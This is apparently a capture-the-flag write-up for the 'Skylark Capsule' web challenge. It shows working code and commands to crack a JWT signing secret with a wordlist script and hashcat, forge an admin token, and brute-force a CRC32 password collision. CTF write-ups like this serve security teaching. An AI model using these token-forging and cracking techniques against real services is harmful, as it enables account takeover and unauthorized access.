# Skylark Capsule

*web*

## Challenge Information

> We have the best capsules available for your deployment into space!

### Additional Resources

After launching the backend system we are presented with a link to a website with the title
*SpaceraceApp*:

![overview over the SpaceraceApp website](res/website_overview.png)

There are three different pages available:
- *Capsule*: This first page only contains greets us with this message:
  > Welcome, space crew! This page will display the deployment specs of your capsule after login :)
- *Login*: The page contains a simple login form with username and password fields.
- *Register*: On this page we can register a new user by entering username, email address and
  password.

## Tasks

### [100 points] Tokenz

> Get your capsule now. Can you gain access to the capsule of 'admin'?

We start by trying out to log in as user `admin` using some common passwords like `admin`,
`password`, `12345` (That's amazing! I've got the same combination on my luggage!) and leaving the
password empty without any success.

Next, we register a new user `user` with email address `email` and password `password`. We are
immediately logged in:

![you are logged in](res/logged_in.png)

Now we can take another look around. While the pages *Login* and *Register* now only show the text
"You are logged in." with a log-out button, the *Capsule* page now presents us with a *Get specs*
button. However, pressing it just results in a disappointing "Failed retrieving specs :(" alert.

After some fiddling around, we found out that logging out and logging in again with our user
changes the behavior and now the *Get specs* button causes the following message to be displayed:

> Successfully retrieved and reviewed your specs. You are all ready for launch. 

As we are supposed to gain access to the capsule of the user `admin`, we will now further examine
the network traffic. When pressing the *Get specs* button, a request to `/user/capsule` is issued
resulting in a JSON response:
```json
{
  "status":200,
  "data":[
    {
      "id":5,
      "username":"user",
      "email":"email",
      "password":"901924565"
    }
  ]
}
```

Let's see if we can reproduce this by using cURL:
```shell
$ curl https://dfcc0832c5e1cbc15c79387ec0686916.challenge.hackazon.org/user/capsule
{"status":401,"error":"error"}
```

Looks as if we are missing some header to make this work. Going through the request headers, we
find an authorization header:
```http
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImlkIjo1LCJ1c2VybmFtZSI6InVzZXIiLCJlbWFpbCI6ImVtYWlsIiwicGFzc3dvcmQiOiI5MDE5MjQ1NjUifSwiaWF0IjoxNjI1NTk1OTQwfQ.fct7HvhkQRh5pvu4Vjze4BCNf0wul3l7cUfjWr0vWzg`
```

Adding this header to our cURL call actually works and we can retrieve our capsule:
```shell
$ curl --header "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImlkIjo1LCJ1c2VybmFtZSI6InVzZXIiLCJlbWFpbCI6ImVtYWlsIiwicGFzc3dvcmQiOiI5MDE5MjQ1NjUifSwiaWF0IjoxNjI1NTk1OTQwfQ.fct7HvhkQRh5pvu4Vjze4BCNf0wul3l7cUfjWr0vWzg" https://dfcc0832c5e1cbc15c79387ec0686916.challenge.hackazon.org/user/capsule
{"status":200,"data":[{"id":5,"username":"user","email":"email","password":"901924565"}]}
```

As we don't recognize the token type, we start by decoding the
Base64:
```shell
$ echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImlkIjo1LCJ1c2VybmFtZSI6InVzZXIiLCJlbWFpbCI6ImVtYWlsIiwicGFzc3dvcmQiOiI5MDE5MjQ1NjUifSwiaWF0IjoxNjI1NTk1OTQwfQ.fct7HvhkQRh5pvu4Vjze4BCNf0wul3l7cUfjWr0vWzg" | base64 -d
{"alg":"HS256","typ":"JWT"}base64: invalid input
```

Ah, this seems to be a [JSON Web Token](https://en.wikipedia.org/wiki/JSON_Web_Token)! After some
reading about the format, we discovered the JWT.IO debugger that can display and edit JWTs:

![JWT debugger displaying the token](res/jwt_debugger.png)

The problem with editing the JTW is that is signed using a cryptographic algorithm (in this case
HMAC-SHA256) with a secret unknown to us. In the best case for us, the signature is not validated
by the server, so let's just change the `username` field in the payload and keep the old signature
in place:
```shell
$ curl --header "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImlkIjo1LCJ1c2VybmFtZSI6ImFkbWluIiwiZW1haWwiOiJlbWFpbCIsInBhc3N3b3JkIjoiOTAxOTI0NTY1In0sImlhdCI6MTYyNTU5NTk0MH0.fct7HvhkQRh5pvu4Vjze4BCNf0wul3l7cUfjWr0vWzg" https://dfcc0832c5e1cbc15c79387ec0686916.challenge.hackazon.org/user/capsule
{"status":401,"error":{"name":"JsonWebTokenError","message":"invalid signature"}}
```

Too bad! Doing some research on JWT vulnerabilities, we find an interesting
[blog post](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
introducing us to the `none` algorithm:
> The none algorithm is a curious addition to JWT. It is intended to be used for situations where
> the integrity of the token has already been verified. Interestingly enough, it is one of only two
> algorithms that are mandatory to implement (the other being HS256).

Sadly, this does not work as well:
```shell
$ echo -n '{"alg":"none","typ":"JWT"}' | base64
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=
                                                      
$ curl --header "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJkYXRhIjp7ImlkIjo1LCJ1c2VybmFtZSI6ImFkbWluIiwiZW1haWwiOiJlbWFpbCIsInBhc3N3b3JkIjoiOTAxOTI0NTY1In0sImlhdCI6MTYyNTU5NTk0MH0." https://dfcc0832c5e1cbc15c79387ec0686916.challenge.hackazon.org/user/capsule 
{"status":401,"error":{"name":"JsonWebTokenError","message":"invalid token"}} 
```

As we are now desperate enough, we will implement a Python script for running a word list attack
against the JWT secret. There is a Python library called [jwt](https://pypi.org/project/jwt/) for
encoding and decoding JWTs, which sounds like a good idea to start with:
```python
import jwt

original_token = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    + "eyJkYXRhIjp7ImlkIjo1LCJ1c2VybmFtZSI6InVzZXIiLCJlbWFpbCI6ImVt"
    + "YWlsIiwicGFzc3dvcmQiOiI5MDE5MjQ1NjUifSwiaWF0IjoxNjI1NTk1OTQwfQ."
    + "fct7HvhkQRh5pvu4Vjze4BCNf0wul3l7cUfjWr0vWzg"
)

encoded_jwt = jwt.encode(
    {
        "data": {
            "id": 5,
            "username": "user",
            "email": "email",
            "password": "901924565",
        },
        "iat": 1625595940,
    },
    "secret",
    algorithm="HS256",
)

print("ORG:", original_token)
print("NEW:", encoded_jwt)
```

The idea here is to create a new JWT with the same payload as our original token using the
(probably incorrect) secret `secret`. We expect header and payload of both tokens to be identical
and the only difference to be the signature. However, the output is rather unexpected:
```shell
$ python3 ./jwt_secret.py
ORG: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImlkIjo1LCJ1c2VybmFtZSI6InVzZXIiLCJlbWFpbCI6ImVtYWlsIiwicGFzc3dvcmQiOiI5MDE5MjQ1NjUifSwiaWF0IjoxNjI1NTk1OTQwfQ.fct7HvhkQRh5pvu4Vjze4BCNf0wul3l7cUfjWr0vWzg
NEW: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImlkIjo1LCJ1c2VybmFtZSI6InVzZXIiLCJlbWFpbCI6ImVtYWlsIiwicGFzc3dvcmQiOiI5MDE5MjQ1NjUifSwiaWF0IjoxNjI1NTk1OTQwfQ.KP4INJ2UswWltUbKXn7j1FONEmQUEkZ6k62cWtb4RAg
```

While the encoded payloads of both tokens are indeed identical, the headers are unfortunately not:
```
ORG: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
NEW: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
```

When we decode both headers, it becomes clear, what is wrong:
```
ORG: b'{"alg":"HS256","typ":"JWT"}'
NEW: b'{"typ":"JWT","alg":"HS256"}'
```

The order of the fields in the header generated by the `jwt` library differs from our original
token! While this would not be an issue for creating a valid JWT for sending it somewhere, our
current goal is to find the correct secret. As the header is taking into account when signing the
token, the signature of our new token would be different. Thus we would not be able to check if we
found the correct secret without sending the token to the server. As this would slow down our word
list attack significantly, we'll have to find another way.

Of course we could just ditch `jwt` and implement the signature ourselves. While this is probably
not that complicated let's first see if we can patch the `jwt` library locally to change the order
to match our original token.

Resolving the `encode()` call in our IDE brings us into the library's `PyJWT.encode()` method. This
method ends up calling into `PyJWS.encode()` where we finally find these lines:
```python
# Header
header = {"typ": self.header_typ, "alg": algorithm}
```

Can it really be that easy? After changing the code to
`header = {"alg": algorithm, "typ": self.header_typ}` we run our script again and the headers are
now identical:
```
ORG: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImlkIjo1LCJ1c2VybmFtZSI6InVzZXIiLCJlbWFpbCI6ImVtYWlsIiwicGFzc3dvcmQiOiI5MDE5MjQ1NjUifSwiaWF0IjoxNjI1NTk1OTQwfQ.fct7HvhkQRh5pvu4Vjze4BCNf0wul3l7cUfjWr0vWzg
NEW: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImlkIjo1LCJ1c2VybmFtZSI6InVzZXIiLCJlbWFpbCI6ImVtYWlsIiwicGFzc3dvcmQiOiI5MDE5MjQ1NjUifSwiaWF0IjoxNjI1NTk1OTQwfQ.fZ_z787VcaZlqDE_zwDAqKY5cP3EcypPtV9E6BvPef8
```

Now it's time to extend the script for our word list attach. After reading the passwords from
`rockyou.txt`, we loop over all of them, create a JWT and compare it to our original token. If
both tokens match, we have found the secret. To get a nice progress bar during the process, we
use the `tqdm` library:
```python
import jwt
from tqdm import tqdm

original_token = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    + "eyJkYXRhIjp7ImlkIjo1LCJ1c2VybmFtZSI6InVzZXIiLCJlbWFpbCI6ImVt"
    + "YWlsIiwicGFzc3dvcmQiOiI5MDE5MjQ1NjUifSwiaWF0IjoxNjI1NTk1OTQwfQ."
    + "fct7HvhkQRh5pvu4Vjze4BCNf0wul3l7cUfjWr0vWzg"
)

payload = {
    "data": {
        "id": 5,
        "username": "user",
        "email": "email",
        "password": "901924565",
    },
    "iat": 1625595940,
}

print("Loading passwords ...")
with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin1") as f:
    passwords = [p.strip() for p in f.readlines()]

for secret in tqdm(passwords):
    encoded_jwt = jwt.encode(
        payload,
        secret,
        algorithm="HS256",
    )
    if encoded_jwt == original_token:
        print("FOUND SECRET:", secret)
        break
```

After about 90 seconds, we got lucky:
```shell
$ python3 ./jwt_secret.py
Loading passwords ...
 26%|████████████▏                                  | 3706823/14344392 [01:23<03:58, 44539.02it/s]
 FOUND SECRET: skylark140584
```

While editing this write-up, I notice that using `hashcat` on the original token would have been
much easier and about 15x faster:
```shell
$ echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImlkIjo1LCJ1c2VybmFtZSI6InVzZXIiLCJlbWFpbCI6ImVtYWlsIiwicGFzc3dvcmQiOiI5MDE5MjQ1NjUifSwiaWF0IjoxNjI1NTk1OTQwfQ.fct7HvhkQRh5pvu4Vjze4BCNf0wul3l7cUfjWr0vWzg" > jwt.txt            

$ hashcat --quiet -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImlkIjo1LCJ1c2VybmFtZSI6InVzZXIiLCJlbWFpbCI6ImVtYWlsIiwicGFzc3dvcmQiOiI5MDE5MjQ1NjUifSwiaWF0IjoxNjI1NTk1OTQwfQ.fct7HvhkQRh5pvu4Vjze4BCNf0wul3l7cUfjWr0vWzg:skylark140584
```

Using the secret, we can now use JWT.IO to create a correctly signed JWT with the payload where we
replaced our username with `admin`:

![JWT debugger with admin token](res/jwt_debugger_admin.png)

Sending this to the server actually reveals our first flag in the response:
```shell
$ curl --header "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImlkIjo1LCJ1c2VybmFtZSI6ImFkbWluIiwiZW1haWwiOiJlbWFpbCIsInBhc3N3b3JkIjoiOTAxOTI0NTY1In0sImlhdCI6MTYyNTU5NTk0MH0.LggIr5vWrCmG1xuuHkDjyKsP_G9eBo-4epLryMwx9oU" https://dfcc0832c5e1cbc15c79387ec0686916.challenge.hackazon.org/user/capsule    
{"status":200,"data":[{"id":4,"username":"admin","email":"admin@spacerace.com","password":"-432570933"}],"flag":"CTF{break1ng_dem_jwtz}"}
```

### [100 points] Hashing

> Skylark is making use of super safe non-cryptographic hashing algorithms. Can you log in as the
> admin?

With our last request we did not only get the first flag but also the password hash for the user
`admin`, which is `-432570933`. As we do not know the password that resulted in this hash, we
cannot figure out what algorithm has been used here. We do, however, know password and hash for our
own user that we created at the start of our journey. Its password hash is `901924565` for the
very secure password `password`.

Using a tool that generates hashes for several algorithms at one, we can now try to identify the
algorith. A Internet search leads us to the website [Md5Calc.com](https://md5calc.com/hash) that
has several algorithm calculators available. Throwing in our string `password` results in all of
them being calculated. As they are displayed in hexadecimal, we have to convert our password hash
to `35c246d5` before we can search the page for it. And indeed, a match comes up:
```
CRC32B 	35c246d5
```

So the "super safe non-cryptographic hashing algorithm" seems to be CRC32B. For Python - this is
claimed by the Internet - the `zlib` library does allegedly implement this in its `crc32()`
function. Let's make sure that this is really the case:
```python
>>> import zlib
>>> password = "password"
>>> hash_value = zlib.crc32(password.encode())
>>> print(hex(hash_value))
0x35c246d5
```

Seems to work as intended. Now we know that we do not have to guess the correct password as any
password that results in the same password should do the trick. As there are only 2 ^ 32 =
4294967296 possible hashes, it is feasible to run a brute-force search for a hash collision. Let's
try feeding incrementing numbers into the hashing function until a matching hash is found:
```python
import ctypes
import zlib

# the password hash from the admin's capsule
admin_hash = -432570933

# convert signed 32-bit integer to unsigned integer
# as this equals the return format of `zlib.crc32()`
admin_hash_uint = ctypes.c_uint(admin_hash).value

i = 0
while True:
    # use counter as password to find a hash collision
    i += 1
    password = str(i)

    # use CRC32B to hash the password
    hash_value = zlib.crc32(password.encode())

    if hash_value == admin_hash_uint:
        print("FOUND COLLISION:", password)
        break
```

After running the script for about 20 minutes (using a faster language for this task would probably
have been a good idea), a password resulting in the known hash is found:
```shell
$ python3 ./find_hash_collision.py
FOUND COLLISION: 2683814530
```

Now we can try logging in as user `admin` with `2683814530` as the password:

![login form with admin credentials](res/admin_login.png)

After logging in, we are finally presented with our second flag:

![second flag](res/second_flag.png)
